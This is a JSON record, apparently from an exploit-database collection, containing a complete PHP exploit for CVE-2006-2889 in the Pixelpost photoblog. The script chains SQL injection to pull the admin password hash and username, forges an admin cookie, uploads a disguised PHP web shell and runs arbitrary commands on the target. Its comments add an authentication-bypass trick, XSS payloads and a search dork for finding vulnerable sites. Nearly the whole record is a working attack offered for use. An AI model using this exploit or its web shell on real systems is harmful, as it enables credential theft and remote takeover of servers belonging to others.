{
  "id": "1868",
  "title": "PixelPost 1-5rc1-2 - Privilege Escalation",
  "cve": "CVE-2006-2889",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"Pixelpost <= 1-5rc1-2 privilege escalation exploit\\r\\n\";\r\necho \"by rgod rgod@autistici.org\\r\\n\";\r\necho \"site: http://retrogod.altervista.org\\r\\n\";\r\necho \"dork: pixelpost \\\"RSS 2.0\\\" \\\"ATOM feed\\\" \\\"Valid xHTML / Valid CSS\\\"\\r\\n\\r\\n\";\r\n\r\n/*\r\nworks with:\r\nmagic_quotes_gpc=Off\r\n*/\r\n\r\nif ($argc<5) {\r\necho \"Usage: php \".$argv[0].\" host path your_ip cmd OPTIONS\\r\\n\";\r\necho \"host:      target server (ip/hostname)\\r\\n\";\r\necho \"path:      path to pixelpost\\r\\n\";\r\necho \"your ip:   your actual ip adress, we need it to build an admin cookie\\r\\n\";\r\necho \"           this is automatically set to your proxy ip if you use one\\r\\n\";\r\necho \"cmd:       a shell command\\r\\n\";\r\necho \"Options:\\r\\n\";\r\necho \"   -T[prefix]   specify a table prefix different from \\\"pixelpost_\\\"\\r\\n\";\r\necho \"   -p[port]:    specify a port other than 80\\r\\n\";\r\necho \"   -P[ip:port]: specify a proxy\\r\\n\";\r\necho \"Examples:\\r\\n\";\r\necho \"php \".$argv[0].\" a.b.c.d /pixelpost/ w.x.y.z cat ./../includes/pixelpost.php\\r\\n\";\r\necho \"php \".$argv[0].\" a.b.c.d / w.x.y.z  ls -la -p81\\r\\n\";\r\necho \"php \".$argv[0].\" a.b.c.d / none ls -la -P1.1.1.1:80\\r\\n\";\r\ndie;\r\n}\r\n/* software site: http://www.pixelpost.org/\r\n\r\n   description: \"A small photoblog application that's a no-brainer to set up and\r\n   use - this is truly for anyone wishing regularly to post their photos on  the\r\n   web like a blog.\"\r\n\r\n   -----\r\n\r\n   i) sql injection in index.php near lines 670-680:\r\n\r\n   ...\r\n   if($_GET['category'] != \"\")\r\n\t{\r\n\t\t// Modified from Mark Lewin's hack for multiple categories\r\n\t\t$query = mysql_query(\"SELECT 1,t2.id,headline,image,datetime\r\n\t\t        \t      FROM  {$pixelpost_db_prefix}catassoc as t1\r\n\t\t\t\t      INNER JOIN {$pixelpost_db_prefix}pixelpost t2 on t2.id = t1.image_id\r\n\t\t\t\t      WHERE t1.cat_id = '\".$_GET['category'].\"'\r\n\t\t\t\t      AND (datetime<='$cdate')\r\n\t\t\t\t      ORDER BY datetime DESC\");\r\n\t\t$lookingfor = 1;\r\n\t}\r\n   ...\r\n\r\n   nice code, isn't it?\r\n\r\n   with magic_quotes_gpc = Off:\r\n   http://[target]/[path]/index.php?x=browse&category='UNION SELECT '1','2',admin,'4','5' FROM pixelpost_config WHERE id=1/*\r\n   http://[target]/[path]/index.php?x=browse&category='UNION SELECT '1','2',password,'4','5' FROM pixelpost_config WHERE id=1/*\r\n\r\n   now, at screen, you have admin username & MD5 password hash and you can build\r\n   an admin cookie:\r\n\r\n   Cookie: pp_user=[username]; pp_password=[sha1([md5hash].[your_ip_address])];\r\n\r\n   Admin can upload .php files in images/ folder, files are renamed but you can\r\n   see new filename in main index page, so... you launch commands:\r\n\r\n   http://[target]/[path]/images/20060603005716_suntzu.php?cmd=cat%20./../includes/pixelpost.php\r\n\r\n   ii) same kind of sql injection in 'archivedate' argument at lines 681-687:\r\n   ...\r\n   ELSE IF ($_GET['archivedate'] != \"\")\r\n\t{\r\n\r\n\t\t$where = \"AND (DATE_FORMAT(datetime, '%Y-%m')='\".$_GET['archivedate'].\"')\"; //DATE_FORMAT(foo, '%Y-%m-%d')\r\n\t\t$query = mysql_query(\"SELECT 1,id,headline,image, datetime FROM \".$pixelpost_db_prefix.\"pixelpost WHERE (datetime<='$cdate') $where ORDER BY datetime desc\");\r\n\t\t$lookingfor = 1;\r\n\t}\r\n   ...\r\n   poc:\r\n\r\n   http://[target]/[path]/index.php?x=browse&archivedate=')%20UNION%20SELECT%20'1','2',password,'4','5'%20FROM%20pixelpost_config/*\r\n\r\n   iii)\r\n   in admin/ folder at the begin of every script, except for index.php, we have:\r\n\r\n   <?php\r\n   if(!isset($_SESSION[\"pixelpost_admin\"]) || $cfgrow['password'] != $_SESSION[\"pixelpost_admin\"]) {\r\n\tdie (\"Try another day!!\");\r\n   }\r\n   ...\r\n\r\n   if register_globals= On, you can easily bybass this protection, poc:\r\n\r\n   http://[target]/]path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1\r\n\r\n   this can be used to see some interesting configuration info about target server:\r\n\r\n   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1&view=info\r\n\r\n   or to launch XSS attacks:\r\n\r\n   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1&view=info&admin_lang_pp_exif1=<script>alert(document.cookie)</script>\r\n   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1&view=info&admin_lang_pp_exif2=<script>alert(document.cookie)</script>\r\n   http://[target]/[path]/admin/view_info.php?_SESSION[pixelpost_admin]=1&cfgrow[password]=1&view=info&admin_lang_pp_path=<script>alert(document.cookie)</script>\r\n\r\n   iv) another xss, without to be logged in:\r\n   http://[target]/[path]/admin/index.php?loginmessage=\"><script>window.open(\"http://retrogod.altervista.org\")</script>\r\n\r\n   \t\t\t\t\t\t\t\t\t      */\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  #debug\r\n  #echo \"\\r\\n\".$html;\r\n\r\n}\r\n\r\nfunction is_hash($hash)\r\n{\r\n if (ereg(\"^[a-f0-9]{32}\",trim($hash))) {return true;}\r\n else {return false;}\r\n}\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$your_ip=$argv[3];\r\n$cmd=\"\";$port=80;$proxy=\"\";$table_prefix=\"pixelpost_\";\r\n\r\nfor ($i=4; $i<=$argc-1; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>\"-p\") and ($temp<>\"-P\") and ($temp<>\"-T\"))\r\n{$cmd.=\" \".$argv[$i];}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-T\")\r\n{\r\n  $table_prefix=str_replace(\"-T\",\"\",$argv[$i]);\r\n}\r\n}\r\n$cmd=urlencode($cmd);\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else\r\n{\r\n$p='http://'.$host.':'.$port.$path;\r\n$temp=explode(\":\",$proxy);\r\n$your_ip=$temp[0];\r\n}\r\n\r\necho \"Trying sql injection in 'category' argument...\\r\\n\";\r\n$sql=\"'/**/UNION SELECT/**/'1','2',password,'4','5'/**/FROM/**/\".$table_prefix.\"config/**/WHERE/**/id=1/*\";\r\n$sql=urlencode($sql);\r\n$packet=\"GET \".$p.\"?x=browse&category=\".$sql.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"alt=\\\"\",$html);\r\n$temp2=explode(\"\\\"\",$temp[1]);\r\n$hash=trim($temp2[0]);\r\nif (is_hash($hash)){\r\necho \"admin md5 password hash -> \".$hash.\"\\r\\n\";\r\n$sql=\"'/**/UNION/**/SELECT/**/'1','2',admin,'4','5'/**/FROM/**/\".$table_prefix.\"config/**/WHERE/**/id=1/*\";\r\n$sql=urlencode($sql);\r\n$packet=\"GET \".$p.\"?x=browse&category=\".$sql.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"alt=\\\"\",$html);\r\n$temp2=explode(\"\\\"\",$temp[1]);\r\n$admin=trim($temp2[0]);\r\necho \"  \\\"   username          -> \".$admin.\"\\r\\n\";\r\n}\r\nelse { echo \"Trying with 'archivedate' argument...\\r\\n\";\r\n$sql=\"')/**/UNION SELECT/**/'1','2',password,'4','5'/**/FROM/**/\".$table_prefix.\"config/**/WHERE/**/id=1/*\";\r\n$sql=urlencode($sql);\r\n$packet=\"GET \".$p.\"?x=browse&archivedate=\".$sql.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"alt=\\\"\",$html);\r\n$temp2=explode(\"\\\"\",$temp[1]);\r\n$hash=trim($temp2[0]);\r\nif (is_hash($hash)){\r\n         echo \"admin md5 password hash -> \".$hash.\"\\r\\n\";\r\n         }\r\nelse {die (\"Exploit failed...magic_quotes_gpc on here or code patched\");}\r\n\r\n$sql=\"')/**/UNION/**/SELECT/**/'1','2',admin,'4','5'/**/FROM/**/\".$table_prefix.\"config/**/WHERE/**/id=1/*\";\r\n$sql=urlencode($sql);\r\n$packet=\"GET \".$p.\"?x=browse&archivedate=\".$sql.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"alt=\\\"\",$html);\r\n$temp2=explode(\"\\\"\",$temp[1]);\r\n$admin=trim($temp2[0]);\r\necho \"  \\\"   username          -> \".$admin.\"\\r\\n\";\r\n}\r\n\r\n$cookie=\"pp_user=\".$admin.\"; pp_password=\".sha1($hash.$your_ip).\";\";\r\n$packet=\"GET \".$p.\"admin/index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"Set-Cookie: \",$html);\r\n$cookie=\"\";\r\nfor ($i=1; $i<=count($temp); $i++)\r\n{\r\n$temp2=explode(\" \",$temp[$i]);\r\n$cookie.=\" \".$temp2[0];\r\n}\r\necho \"admin cookie            ->\".$cookie.\"\\r\\n\";\r\n\r\n$shell=\r\n'<?php\r\nif (get_magic_quotes_gpc()){$_REQUEST[\"cmd\"]=stripslashes($_REQUEST[\"cmd\"]);}\r\nini_set(\"max_execution_time\",0);\r\nerror_reporting(0);\r\necho chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);\r\npassthru($_REQUEST[\"cmd\"]);\r\necho chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);\r\n?>';\r\nsrand(make_seed());\r\n$anumber = rand(1,99999);\r\n$my_file=\"suntzu\".$anumber.\".php\";\r\n$data='\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"headline\"\r\n\r\nUnder Costruction... - Admin.\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"category[]\"\r\n\r\n1\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"body\"\r\n\r\n\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"autodate\"\r\n\r\n3\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"post_year\"\r\n\r\n\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"post_month\"\r\n\r\n\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"post_day\"\r\n\r\n\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"post_hour\"\r\n\r\n\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"post_minute\"\r\n\r\n\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"'.$my_file.'\"\r\nContent-Type: image/jpeg\r\n\r\n'.$shell.'\r\n-----------------------------7d6318101b00a2\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n-----------------------------7d6318101b00a2--\r\n';\r\n\r\n$packet=\"POST \".$p.\"admin/index.php?x=save HTTP/1.0\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d6318101b00a2\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n\r\n$packet=\"GET \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"img src=\\\"\",$html);\r\n$temp2=explode(\" \",$temp[1]);\r\nfor ($i=1; $i<=count($temp); $i++)\r\n{\r\n$temp2=explode(\"\\\"\",$temp[$i]);\r\nif (eregi($my_file,$temp2[0]))\r\n {\r\n  $my_path=$temp2[0];\r\n  echo \"shell -> \".$my_path.\"\\r\\n\";\r\n  break;\r\n }\r\n}\r\n\r\n$packet=\"GET \".$p.$my_path.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: cmd=\".$cmd.\";\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nif (strstr($html,\"*deli*\"))\r\n{\r\n $temp=explode(\"*deli*\",$html);\r\n die(\"Exploit succeeded...\\r\\n\".$temp[1]);\r\n}\r\nelse\r\n{\r\n echo \"Failed to launch commands...\";\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-06-03]",
  "url": "https://www.exploit-db.com/exploits/1868"
}